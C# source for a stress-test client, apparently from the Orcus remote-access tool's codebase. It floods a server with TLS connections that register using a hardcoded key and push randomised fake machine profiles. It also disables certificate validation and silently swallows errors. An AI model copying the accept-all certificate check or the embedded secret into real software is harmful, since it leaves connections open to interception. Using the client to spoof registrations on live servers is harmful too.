using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Web.Script.Serialization;
using Orcus.Shared.Client;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace ServerStressTest
{
    internal class Client
    {
        private static readonly Random Random = new Random();

        private static readonly string[] Cultures =
        {
            "af-ZA", "sq-AL", "ar-DZ", "ar-BH", "ar-EG", "ar-IQ", "ar-JO", "ar-KW", "ar-LB", "ar-LY", "ar-MA", "ar-OM",
            "ar-QA", "ar-SA", "ar-SY", "ar-TN", "ar-AE", "ar-YE", "hy-AM", "Cy-az", "Lt-az", "eu-ES", "be-BY", "bg-BG",
            "ca-ES", "zh-CN", "zh-HK", "zh-MO", "zh-SG", "zh-TW", "zh-CH", "zh-CH", "hr-HR", "cs-CZ", "da-DK", "iv-MV",
            "nl-BE", "nl-NL", "en-AU", "en-BZ", "en-CA", "en-CB", "en-IE", "en-JM", "en-NZ", "en-PH", "en-ZA", "en-TT",
            "en-GB", "en-US", "en-ZW", "et-EE", "fo-FO", "fa-IR", "fi-FI", "fr-BE", "fr-CA", "fr-FR", "fr-LU", "fr-MC",
            "fr-CH", "gl-ES", "ka-GE", "de-AT", "de-DE", "de-LI", "de-LU", "de-CH", "el-GR", "gu-IN", "he-IL", "hi-IN",
            "hu-HU", "is-IS", "id-ID", "it-IT", "it-CH", "ja-JP", "kn-IN", "kk-KZ", "ok-IN", "ko-KR", "ky-KZ", "lv-LV",
            "lt-LT", "mk-MK", "ms-BN", "ms-MY", "mr-IN", "mn-MN", "nb-NO", "nn-NO", "pl-PL", "pt-BR", "pt-PT", "pa-IN",
            "ro-RO", "ru-RU", "sa-IN", "Cy-sr", "Lt-sr", "sk-SK", "sl-SI", "es-AR", "es-BO", "es-CL", "es-CO", "es-CR",
            "es-DO", "es-EC", "es-SV", "es-GT", "es-HN", "es-MX", "es-NI", "es-PA", "es-PY", "es-PE", "es-PR", "es-ES",
            "es-UY", "es-VE", "sw-KE", "sv-FI", "sv-SE", "yr-SY", "ta-IN", "tt-RU", "te-IN", "th-TH", "tr-TR", "uk-UA",
            "ur-PK", "Cy-uz", "Lt-uz", "vi-VN"
        };

        private static readonly Dictionary<string, OSType> OperationgSystems = new Dictionary<string, OSType>
        {
            {"Windows 10 Home", OSType.Windows10},
            {"Windows 10 Pro", OSType.Windows10},
            {"Windows 8", OSType.Windows8},
            {"Windows 8.1", OSType.Windows8},
            {"Windows 7 Home Premium", OSType.Windows7},
            {"Windows 7 Professional", OSType.Windows7},
            {"Windows Vista", OSType.Windows7},
            {"Windows XP", OSType.Windows7}
        };

        private static readonly string[] RandomNames =
        {
            "Margaret Martinez", "Julia Coleman", "Benjamin James", "Lillian Bryant", "William Howard",
            "Elizabeth Griffin",
            "Lois Jenkins", "Ralph Martin", "Carlos Williams", "Patrick Perez", "Louise Sanchez", "Karen Hughes",
            "Ashley Jones", "Charles Robinson", "Matthew Butler", "Deborah Washington", "Wayne Foster", "Eric Bailey",
            "Anne Ross", "Eugene Wilson", "Donald Patterson", "Sandra Anderson", "Alice Murphy", "Steve Evans",
            "Ronald Rodriguez", "Tammy Barnes", "Lawrence Smith", "Nicole Turner", "Bonnie Carter", "Juan Young",
            "Denise Phillips", "Laura Roberts", "Heather Rivera", "Andrew Gonzalez", "Judith Wood", "Louis Long",
            "Edward Henderson", "Sarah Jackson", "Michelle Harris", "Theresa Perry", "Andrea Simmons", "Raymond Brown",
            "Martin Reed", "Irene Mitchell", "Chris Thompson", "Doris Davis", "Rachel Alexander", "Donna Green",
            "Sara Hill", "Janice Edwards", "Wanda Moore", "Frances Ward", "Katherine Collins", "Melissa Lopez",
            "Paul Powell", "Douglas Taylor", "Joshua Ramirez", "Todd Peterson", "Alan Hernandez", "Amanda Price",
            "Julie Cook", "Tina Wright", "Linda Thomas", "Virginia Watson", "Amy Cox", "Craig Garcia", "Jason Nelson",
            "Gloria Allen", "Joyce Bell", "Phillip Sanders", "Kathryn Morgan", "John Richardson", "Christopher Scott",
            "Brian Walker", "Annie Clark", "Joan Rogers", "George Campbell", "Joseph Johnson", "Mark Diaz",
            "Harry Bennett", "Gary Morris", "Norma Gray", "Patricia Adams", "Barbara Russell", "Bruce King", "Ann White",
            "Jose Miller", "Diane Stewart", "Arthur Kelly", "Adam Lee", "Jesse Parker", "Victor Flores", "Philip Lewis",
            "Earl Cooper", "Phyllis Gonzales", "Pamela Brooks", "Billy Baker", "Samuel Torres", "Lisa Hall", "Terry"
        };

        private static readonly List<KeyValuePair<double, double>> CenteredCoordinates =
            new List<KeyValuePair<double, double>>
            {
                new KeyValuePair<double, double>(58.147519, 88.769531), //Russia
                new KeyValuePair<double, double>(13.368243, 17.753906), //Africa
                new KeyValuePair<double, double>(57.774518, -109.160156), //America
                new KeyValuePair<double, double>(37.544577, 80.683594), //Asia
                new KeyValuePair<double, double>(49.468124, 21.621094), //Europe
                new KeyValuePair<double, double>(-27.566721, 134.121094), //Australia
                new KeyValuePair<double, double>(61.501734, -117.949219), //Canada
                new KeyValuePair<double, double>(-17.182779, -58.535156) //South America
            };

        public bool IsConnected { get; set; }
        public bool AuthenticateAsTestClient { get; set; } = true;

        public ServerConnection Connection { get; set; }

        public bool Connect(string ip, int port)
        {
            TcpClient client = null;
            SslStream stream = null;
            BinaryReader binaryReader = null;
            BinaryWriter binaryWriter = null;

            try
            {
                if (TryConnect(out client, out stream, ip, port))
                {
                    binaryWriter = new BinaryWriter(stream);
                    binaryReader = new BinaryReader(stream);

                    binaryWriter.Write((byte) 0); //ClientRegister
                    binaryWriter.Write(1);

                    if (binaryReader.ReadByte() != 0)
                        return false;

                    if (Register(binaryReader, binaryWriter))
                    {
                        SendInformation(stream);
                        IsConnected = true;
                        Connection = new ServerConnection(client, stream, binaryReader, binaryWriter);
                        return true;
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            binaryReader?.Close();
            binaryWriter?.Close();
            stream?.Dispose();
            client?.Close();
            return false;
        }

        private bool Register(BinaryReader binaryReader, BinaryWriter binaryWriter)
        {
            //binaryWriter.Write((byte) AuthentificationIntention.ClientRegister);
            if (binaryReader.ReadByte() != (byte) AuthentificationFeedback.GetKey)
                return false;

            var keyIndex = binaryReader.ReadInt32();
            var keys = new KeyDatabase();
            binaryWriter.Write(keys.GetKey(keyIndex,
                "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh"));
            if (binaryReader.ReadByte() != (byte) AuthentificationFeedback.GetHardwareId)
                return false;
            binaryWriter.Write(GetHardwareId());

            var result = binaryReader.ReadByte();
            if ((AuthentificationFeedback) result == AuthentificationFeedback.GetClientTag)
            {
                binaryWriter.Write("Stress Test");
                result = binaryReader.ReadByte();
            }

            return result == (byte) AuthentificationFeedback.Accepted;
        }

        private static bool TryConnect(out TcpClient tcpClient, out SslStream stream, string ip, int port)
        {
            tcpClient = null;
            stream = null;

            var client = new TcpClient();
            try
            {
                var result = client.BeginConnect(ip, port, null, null);
                var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
                if (!success)
                    return false;

                client.EndConnect(result);
            }
            catch (Exception)
            {
                return false;
            }

            var sslStream = new SslStream(client.GetStream(), false, UserCertificateValidationCallback);

            try
            {
                var serverName = Environment.MachineName;
                sslStream.AuthenticateAsClient(serverName);
            }
            catch (AuthenticationException)
            {
                sslStream.Dispose();
                client.Close();
                return false;
            }

            tcpClient = client;
            stream = sslStream;
            return true;
        }

        private static void SendInformation(Stream stream)
        {
            var data = new BasicComputerInformation
            {
                Language = Cultures[Random.Next(0, Cultures.Length)],
                UserName = RandomNames[Random.Next(0, RandomNames.Length)],
                IsAdministrator = Random.Next(0, 3) == 0,
                IsServiceRunning = Random.Next(0, 5) == 0,
                Plugins = new List<PluginInfo>(),
                ClientConfig = null,
                ClientVersion = Random.Next(2, 10)
            };

            var os = OperationgSystems.ElementAt(Random.Next(0, OperationgSystems.Count));
            data.OperatingSystemName = os.Key;
            data.OperatingSystemType = os.Value;
            /*
            var area = CenteredCoordinates[Random.Next(0, CenteredCoordinates.Count)];
            data.Latitude = (float) (area.Key + Random.Next(-20, 21)*Random.NextDouble());
            data.Longitude = (float) (area.Value + Random.Next(-20, 21)*Random.NextDouble());
            */
            var serializer = new Serializer(typeof (BasicComputerInformation));
            serializer.Serialize(stream, data);
        }


        private string GetHardwareId()
        {
            return AuthenticateAsTestClient ? "2690661700324bd186df7679ba2ceed5" : Guid.NewGuid().ToString("N");
        }

        private static bool UserCertificateValidationCallback(object sender, X509Certificate certificate,
            X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}